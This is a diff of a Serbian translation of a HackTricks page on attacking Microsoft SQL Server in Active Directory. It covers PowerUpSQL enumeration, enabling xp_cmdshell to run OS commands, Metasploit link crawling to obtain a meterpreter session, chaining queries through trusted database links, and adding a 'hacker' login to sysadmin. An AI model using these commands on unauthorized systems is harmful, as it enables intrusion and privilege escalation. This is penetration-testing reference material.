@@ -12,10 +12,9 @@
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
-
 
 ## **MSSQL Enumeracija / Otkrivanje**
 
@@ -23,7 +22,7 @@ Powershell modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma kor
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
-### Nabrajanje sa mreže bez sesije domena
+### Nabrojavanje sa mreže bez sesije domena
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -56,7 +55,7 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## Osnovno zloupotreba MSSQL
+## Osnovno zloupotreba MSSQL-a
 
 ### Pristup bazi podataka
 ```powershell
@@ -72,20 +71,20 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Moguće je takođe **izvršiti komande** unutar MSSQL servera
+Takođe je moguće **izvršiti komande** unutar MSSQL hosta
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-### MSSQL Osnovni trikovi hakovanja
+### Osnovni trikovi hakovanja MSSQL
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## MSSQL Povereni linkovi
+## MSSQL Poverljive veze
 
-Ako je instanca MSSQL-a poverena (link baze podataka) drugoj instanci MSSQL-a. Ako korisnik ima privilegije nad poverenom bazom podataka, moći će **iskoristiti povereni odnos da izvršava upite i na drugoj instanci**. Ovi povereni odnosi mogu biti povezani i u nekom trenutku korisnik može pronaći nekonfigurisanu bazu podataka gde može izvršavati komande.
+Ako je instanca MSSQL poverljiva (veza baze podataka) sa drugom instancom MSSQL. Ako korisnik ima privilegije nad poverljivom bazom podataka, moći će **iskoristiti povereni odnos da izvršava upite i na drugoj instanci**. Ove veze mogu biti povezane i u nekom trenutku korisnik može pronaći nekonfigurisanu bazu podataka gde može izvršavati komande.
 
 **Veze između baza podataka funkcionišu čak i preko poverenja šuma.**
 
@@ -123,23 +122,23 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Možete lako proveriti pouzdane veze koristeći Metasploit.
+Možete lako proveriti pouzdane veze koristeći metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Primetite da će metasploit pokušati da zloupotrebi samo funkciju `openquery()` u MSSQL (tako da, ako ne možete izvršiti naredbu pomoću `openquery()`, moraćete ručno isprobati metod `EXECUTE` za izvršavanje naredbi, više detalja ispod.)
+Primetite da će metasploit pokušati da zloupotrebi samo funkciju `openquery()` u MSSQL (tako da, ako ne možete izvršiti komandu pomoću `openquery()`, moraćete probati `EXECUTE` metod **ručno** da biste izvršili komande, više detalja ispod.)
 
 ### Ručno - Openquery()
 
-Sa **Linux-a** možete dobiti konzolu MSSQL-a pomoću **sqsh** i **mssqlclient.py.**
+Sa **Linuxa** možete dobiti MSSQL konzolni shell pomoću **sqsh** i **mssqlclient.py.**
 
-Sa **Windows-a** takođe možete pronaći linkove i ručno izvršavati naredbe koristeći **MSSQL klijent kao što je** [**HeidiSQL**](https://www.heidisql.com)
+Sa **Windowsa** takođe možete pronaći linkove i ručno izvršavati komande koristeći **MSSQL klijent kao što je** [**HeidiSQL**](https://www.heidisql.com)
 
 _Prijavite se koristeći Windows autentifikaciju:_
 
-![](<../../.gitbook/assets/image (805).png>) 
+![](<../../.gitbook/assets/image (805).png>)
 
 #### Pronalaženje pouzdanih linkova
 ```sql
@@ -150,7 +149,7 @@ EXEC sp_linkedservers;
 
 #### Izvršavanje upita u pouzdanom linku
 
-Izvršite upite putem linka (primer: pronađite više linkova u novom pristupačnom primeru):
+Izvršite upite putem linka (primer: pronađite više linkova u novom pristupačnom primerku):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -180,12 +179,12 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQL lokalni korisnik** obično ima poseban tip privilegije nazvan **`SeImpersonatePrivilege`**. Ovo omogućava nalogu da "impersonira klijenta nakon autentikacije".
 
-Strategija koju su mnogi autori osmislili je da prisile **SYSTEM** servis da se autentikuje na lažni ili "man-in-the-middle" servis koji napadač kreira. Ovaj lažni servis može zatim da impersonira **SYSTEM** servis dok pokušava da se autentikuje.
+Strategija koju su mnogi autori osmislili je da prisile **sistemski servis** da se autentikuje na lažni ili servis između koji napadač kreira. Ovaj lažni servis zatim može da impersonira sistemski servis dok pokušava da se autentikuje.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) ima kolekciju različitih tehnika koje se mogu izvršiti putem Beacon-ove komande `execute-assembly`.
 
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -193,7 +192,7 @@ Strategija koju su mnogi autori osmislili je da prisile **SYSTEM** servis da se 
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite vašu **kompaniju reklamiranu na HackTricks**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
